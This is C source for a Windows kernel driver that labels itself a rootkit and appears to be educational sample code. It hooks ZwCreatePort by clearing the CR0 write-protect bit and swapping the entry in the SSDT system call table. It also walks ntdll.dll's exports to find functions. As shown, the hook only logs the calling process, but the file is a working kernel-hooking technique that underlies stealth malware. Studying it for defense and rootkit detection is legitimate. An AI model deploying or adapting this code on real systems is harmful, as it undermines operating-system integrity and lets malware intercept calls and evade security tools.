// BASIC DEVICE DRIVER

#include "ntddk.h"
#include "peheader.h"

// Length of process name (rounded up to next DWORD)
#define PROCNAMELEN     20
// Maximum length of NT process name
#define NT_PROCNAMELEN  16

ULONG gProcessNameOffset;

// a cheap way to steal the call number based on the mov instruction
// that lives at the function address.  For example,
//
//		mov     eax, 28h
//
// Every Zw* function starts with a mov instruction that moves the
// call number in EAX.  Thus the call number is 1 byte past the start
// of the function.  It's a hack.  It works for any Zw* function
// exported from ntoskrnl.exe
#define SYSCALL_INDEX(_Function) *(PULONG)((PUCHAR)_Function+1)


/////////////////////////////////////////////////////////////////////////
// the system call table infoz
/////////////////////////////////////////////////////////////////////////
#pragma pack(1)
typedef struct ServiceDescriptorTable 
{
	unsigned int *ServiceTableBase;
	unsigned int *ServiceCounterTableBase; //Used only in checked build
	unsigned int NumberOfServices;
	unsigned char *ParamTableBase;
} SERVICE_DESCRIPTOR_TABLE, *PSERVICE_DESCRIPTOR_TABLE;
#pragma pack()

//exported from ntoskrnl.exe
__declspec(dllimport)  SERVICE_DESCRIPTOR_TABLE KeServiceDescriptorTable;
#define SYSTEMSERVICE(_function)  KeServiceDescriptorTable.ServiceTableBase[ *(PULONG)((PUCHAR)_function+1)]

/////////////////////////////////////////////////////////////////////////
// we use ZwQuerySystemInformation to find ntdll.dll in memory
/////////////////////////////////////////////////////////////////////////
NTSYSAPI
NTSTATUS
NTAPI ZwQuerySystemInformation(
            IN ULONG SystemInformationClass,
			IN PVOID SystemInformation,
			IN ULONG SystemInformationLength,
			OUT PULONG ReturnLength);

// for reading the system module infoz
#define SystemModuleInformation     11

#pragma pack(1)
typedef struct _SYSTEM_MODULE_INFORMATION {
    ULONG  Reserved[2];
    PVOID  Base;
    ULONG  Size;
    ULONG  Flags;
    USHORT Index;
    USHORT Unknown;
    USHORT LoadCount;
    USHORT ModuleNameOffset;
    CHAR   ImageName[256];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION;
#pragma pack()


NTSYSAPI
NTSTATUS
NTAPI
ZwCreatePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown
);

typedef NTSTATUS (*ZWCREATEPORT)(
            PHANDLE PortHandle, 
			POBJECT_ATTRIBUTES ObjectAttributes,
			ULONG MaxConnectInfoLength, 
			ULONG MaxDataLength, 
			ULONG Unknown
);

ZWCREATEPORT OldZwCreatePort;
PVOID gFunctionAddressForZwCreatePort;

/* Find the offset of the process name within the executive process
   block.  We do this by searching for the first occurance of "System"
   in the current process when the device driver is loaded. */

void GetProcessNameOffset()
{
  PEPROCESS curproc = PsGetCurrentProcess();
  int i;
  for( i = 0; i < 3*PAGE_SIZE; i++ ) 
  {
      if( !strncmp( "System", (PCHAR) curproc + i, strlen("System") ))
	{
	  gProcessNameOffset = i;
	}
  }
}

/* Copy the process name into the specified buffer.  */

ULONG GetProcessName( PCHAR theName )
{
  PEPROCESS       curproc;
  char            *nameptr;
  ULONG           i;
  KIRQL           oldirql;

  if( gProcessNameOffset ) 
    {
      curproc = PsGetCurrentProcess();
      nameptr   = (PCHAR) curproc + gProcessNameOffset;
      strncpy( theName, nameptr, NT_PROCNAMELEN );
      theName[NT_PROCNAMELEN] = 0; /* NULL at end */
      return TRUE;
    } 
  return FALSE;
}

NTSTATUS NewZwCreatePort(
	PHANDLE PortHandle, 
	POBJECT_ATTRIBUTES ObjectAttributes,
	ULONG MaxConnectInfoLength, 
	ULONG MaxDataLength, 
	ULONG Unknown )
{
		NTSTATUS rc;
        CHAR aProcessName[PROCNAMELEN];
                
        GetProcessName( aProcessName );
        DbgPrint("rootkit: NewZwCreatePort() from %s\n", aProcessName);

        rc = ((ZWCREATEPORT)(OldZwCreatePort)) (
                        PortHandle,
						ObjectAttributes,
						MaxConnectInfoLength,
						MaxDataLength,
						Unknown);

		return(rc);
}


VOID Unload( IN PDRIVER_OBJECT DriverObject )
{
	DbgPrint("Unload called\n");

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	// put back the old function pointer
	InterlockedExchange( (PLONG) &(SYSTEMSERVICE(gFunctionAddressForZwCreatePort)), 
						 (LONG) OldZwCreatePort);


	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

}



NTSTATUS StubbedDispatch(
				  IN PDEVICE_OBJECT theDeviceObject,
				  IN PIRP theIrp )
{
	theIrp->IoStatus.Status = STATUS_SUCCESS;
	IoCompleteRequest( theIrp, IO_NO_INCREMENT );

	return theIrp->IoStatus.Status;
}

// adapted from Native API Reference, Gary Nebbett
PVOID FindNT()
{
	ULONG n;
	PULONG q;
	PSYSTEM_MODULE_INFORMATION p;
	PVOID ntdll = 0;
	ULONG i;

	ZwQuerySystemInformation(	SystemModuleInformation,
								&n,
								0,
								&n);
	
	q = (PULONG) ExAllocatePool( PagedPool, n );
	
	ZwQuerySystemInformation(	SystemModuleInformation,
								q,
								n * sizeof( *q ),
								0);

	p = (PSYSTEM_MODULE_INFORMATION) (q + 1);

	for( i = 0; i < *q; i++)
	{
		//DbgPrint("comparing to %s\n", (p[i].ImageName + p[i].ModuleNameOffset));
		if(0 == _stricmp(p[i].ImageName + p[i].ModuleNameOffset, "ntdll.dll"))
		{
			ntdll = p[i].Base;
			break;
		}
	}

	ExFreePool(q);
	return ntdll;
}

PVOID FindFunc( PVOID Base, PCSTR Name )
{
	PIMAGE_DOS_HEADER dos;
	PIMAGE_NT_HEADERS32 nt;
	PIMAGE_DATA_DIRECTORY expdir;
	ULONG size;
	ULONG addr;
	PIMAGE_EXPORT_DIRECTORY exports;
	PULONG functions;
	PSHORT ordinals;
	PULONG names;
	PVOID func = 0;
	ULONG i;

	dos = (PIMAGE_DOS_HEADER)Base;
	//DbgPrint("dos 0x%08X\n", dos);
	
	nt = (PIMAGE_NT_HEADERS32)( (PCHAR)Base + dos->e_lfanew );
	//DbgPrint("nt 0x%08X\n", nt);
	
	expdir = nt->OptionalHeader.DataDirectory + IMAGE_DIRECTORY_ENTRY_EXPORT;
	//DbgPrint("expdir 0x%08X\n", expdir);

	size = expdir->Size;
	//DbgPrint("size 0x%08X\n", size);

	addr = expdir->VirtualAddress;
	//DbgPrint("addr 0x%08X\n", addr);

	exports = (PIMAGE_EXPORT_DIRECTORY)( (PCHAR)Base + addr);
	//DbgPrint("exports 0x%08X\n", exports);

	functions = (PULONG)( (PCHAR)Base + exports->AddressOfFunctions);
	//DbgPrint("functions 0x%08X\n", functions);

	ordinals = (PSHORT)( (PCHAR)Base + exports->AddressOfNameOrdinals);
	//DbgPrint("ordinals 0x%08X\n", ordinals);

	names = (PULONG)( (PCHAR)Base + exports->AddressOfNames);
	//DbgPrint("names 0x%08X\n", names);

	DbgPrint("number of names %d\n", exports->NumberOfNames);

	for (i = 0; i < exports->NumberOfNames; i++)
	{
		ULONG ord = ordinals[i];
		if(functions[ord] < addr || functions[ord] >= addr + size)
		{
			//DbgPrint("Comparing name %s to %s\n", (PSTR)( (PCHAR)Base + names[i]), Name);

			if(0 == strcmp((PSTR)( (PCHAR)Base + names[i]), Name ) )
			{
				func = (PCHAR)Base + functions[ord];
			}
		}
	}

	return func;
}

// This gets the address for any function that is exported from NTDLL.DLL
PVOID GetCallAddress( PCSTR Name )
{
	ULONG syscall_number = -1;
	PVOID base; 
	PVOID func;

	base = FindNT();
	if(base)
	{
		func = (PVOID) FindFunc( base, Name );
	
		if(func)
		{
			return func;
		}
		else
		{
			DbgPrint("Could not find function address for %s\n", Name );
		}
	}
	else
	{
		DbgPrint("Could not find base of NTDLL.DLL\n");
	}
	return 0;
}

NTSTATUS DriverEntry( IN PDRIVER_OBJECT theDriverObject, IN PUNICODE_STRING theRegistryPath )
{
	int i;
	
	DbgPrint("Rootkit: Loaded to hook non-exported functions in the kernel.\n");

	GetProcessNameOffset();

	theDriverObject->DriverUnload  = Unload; 

	for(i = 0; i <= IRP_MJ_MAXIMUM_FUNCTION; i++)
	{
		theDriverObject->MajorFunction[i] = StubbedDispatch;
	}

	gFunctionAddressForZwCreatePort = GetCallAddress("ZwCreatePort");

	// UNProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		and		eax, 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}


	// place the hook using InterlockedExchange (no need to disable interrupts)
	// this uses the LOCK instruction to lock the memory bus during the next instruction 
	// Example:
	// LOCK INC DWORD PTR [EDX+04] 
	// This staves off collisions on multi-processor machines, while cli/sti only disable interrupts
	// on the current processor.
	//

	OldZwCreatePort = 
		(ZWCREATEPORT) InterlockedExchange(		(PLONG) &(SYSTEMSERVICE(gFunctionAddressForZwCreatePort)), 
												(LONG) NewZwCreatePort);

	// REProtect memory
	__asm
	{
		push	eax
		mov		eax, CR0
		or		eax, NOT 0FFFEFFFFh
		mov		CR0, eax
		pop		eax
	}

	
	return STATUS_SUCCESS;
}

